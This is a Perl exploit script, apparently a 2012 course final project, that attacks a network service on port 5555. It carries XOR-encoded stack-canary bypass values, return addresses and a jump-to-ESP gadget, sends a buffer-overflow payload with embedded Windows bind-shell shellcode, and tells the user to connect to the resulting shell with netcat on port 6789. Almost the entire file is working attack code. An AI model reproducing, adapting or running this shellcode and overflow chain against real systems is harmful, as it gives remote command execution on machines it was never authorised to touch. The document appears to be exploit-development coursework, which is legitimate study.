#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment - Final Project
# File: exploit2.pl
# Last modified: 30 Mar 2012
#---------------------------------------------
#
#  INSTRUCTIONS - change the target IP address listed below
#                 then execute this script
#                 connect to a command shell via netcat on port 6789
#
#$xorB = "\x83";
$targetIP = '127.0.0.1';
$canary = "\x0d\xf0\xce\xfa" ^ "\x83"x4;
$userId = "\x74\x40\x40\x00" ^ "\x83"x4;
$lsbCnt = "\x0b" ^ "\x83";
$ppRet  = "\x2e\x1e\x40\x00" ^ "\x83"x4;
$jmpESP = "\x67\x2d\x41\x00" ^ "\x83"x4;
#  E998feffff              jmp long (-360)
$jmpBackL = "\xe9\x98\xfe\xff\xff" ^ "\x83"x5;
#  EB1D              jmp short (-25)
$jmpBackS = "\xeb\xe7" ^ "\x83"x2;
#  81EC9102          sub sp,0x182
$subESP =  "\x81\xec\x82\x01\x00\x00" ^ "\x83"x6;
$socket = "\x7c\x07\x00\x00" ^ "\x83"x4;

# bindsock windows shellcode (port 6789)
# 348 bytes  (520-348=172)
my $win_shellcode =
	"\xeb\x62\x56\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70" .
	"\x1c\xad\x8b\x40\x08\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b" .
	"\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x33\x49" .
	"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca" .
	"\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe2\x8b\x5f\x24\x01\xeb" .
	"\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44" .
	"\x24\x1c\x61\xc3\xeb\x31\xad\x50\x52\xe8\xa9\xff\xff\xff\x89\x07" .
	"\x83\xc4\x08\x83\xc7\x04\x39\xce\x75\xec\xc3\x8e\x4e\x0e\xec\x72" .
	"\xfe\xb3\x16\x7e\xd8\xe2\x73\xd9\x09\xf5\xad\xa4\x1a\x70\xc7\xa4" .
	"\xad\x2e\xe9\xe5\x49\x86\x49\x83\xec\x60\x89\xe5\xeb\x02\xeb\x05" .
	"\xe8\xf9\xff\xff\xff\x5e\xe8\x57\xff\xff\xff\x89\xc2\x83\xee\x2a" .
	"\x8d\x7d\x04\x89\xf1\x83\xc1\x0c\xe8\xa9\xff\xff\xff\x83\xc1\x10" .
	"\x31\xc0\x66\xb8\x33\x32\x50\x68\x77\x73\x32\x5f\x89\xe3\x51\x52" .
	"\x53\xff\x55\x04\x5a\x59\x89\xc2\xe8\x89\xff\xff\xff\xb8\x01\x63" .
	"\x6d\x64\xc1\xf8\x08\x50\x89\x65\x34\x31\xc0\x50\x50\x50\x50\x40" .
	"\x50\x40\x50\xff\x55\x10\x89\xc6\x31\xc0\x31\xdb\x50\x50\x50\xb8" .
	"\x02\x01\x1a\x85\xfe\xcc\x50\x89\xe0\xb3\x10\x53\x50\x56\xff\x55" .
	"\x14\x53\x56\xff\x55\x18\x53\x89\xe2\x29\xdc\x89\xe1\x52\x51\x56" .
	"\xff\x55\x1c\x89\xc6\x31\xc9\xb1\x54\x29\xcc\x89\xe7\x57\x31\xc0" .
	"\xf3\xaa\x5f\xc6\x07\x44\xfe\x47\x2d\x57\x89\xf0\x8d\x7f\x38\xab" .
	"\xab\xab\x5f\x31\xc0\x8d\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48" .
	"\x50\x50\xff\x75\x34\x50\xff\x55\x08\xff\x55\x0c";

$str_xor = "\x83"x348;
$xor_shellcode = $win_shellcode ^ $str_xor;

use IO::Socket; 
my $sock = new IO::Socket::INET (
 	PeerAddr => $targetIP,
 	PeerPort => '5555',
 	Proto => 'tcp',
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

#send the userId
#  83EC0A            sub sp,byte +0xa
#  C3                ret
print $sock "c30aec83";
$data = <$sock>;
print $data;

print $sock "\x13"x160 . $subESP . $xor_shellcode . "\x13"x1 . $jmpBackL;
print $sock $lsbCnt . $canary . "\x13"x6;
print $sock  $jmpESP . $jmpBackS . $userId;

close($sock);
